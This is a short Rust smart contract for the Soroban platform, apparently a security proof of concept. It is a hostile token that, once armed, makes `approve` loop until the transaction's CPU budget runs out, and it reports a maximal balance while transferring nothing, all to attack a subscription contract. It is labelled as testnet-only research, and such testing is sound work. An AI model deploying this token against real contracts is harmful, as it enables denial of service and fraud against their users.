#![no_std]
//! Minimal hostile token for the experiment described in SECURITY.md.
//!
//! It implements only what the subscription contract calls. `approve` spins
//! until the transaction's CPU budget is exhausted once `arm` has been
//! called. For testing on Testnet only.

use soroban_sdk::{contract, contractimpl, symbol_short, Address, Env};

#[contract]
pub struct BudgetExhaustingToken;

#[contractimpl]
impl BudgetExhaustingToken {
    /// Make every later `approve` burn the whole budget.
    pub fn arm(env: Env) {
        env.storage().instance().set(&symbol_short!("armed"), &true);
    }

    pub fn approve(
        env: Env,
        _from: Address,
        _spender: Address,
        _amount: i128,
        _expiration_ledger: u32,
    ) {
        if env.storage().instance().get(&symbol_short!("armed")).unwrap_or(false) {
            let mut n: u64 = 0;
            loop {
                n = core::hint::black_box(n.wrapping_add(1));
            }
        }
    }

    pub fn allowance(_env: Env, _from: Address, _spender: Address) -> i128 {
        0
    }

    pub fn balance(_env: Env, _id: Address) -> i128 {
        i128::MAX
    }

    pub fn transfer_from(
        _env: Env,
        _spender: Address,
        _from: Address,
        _to: Address,
        _amount: i128,
    ) {
    }
}
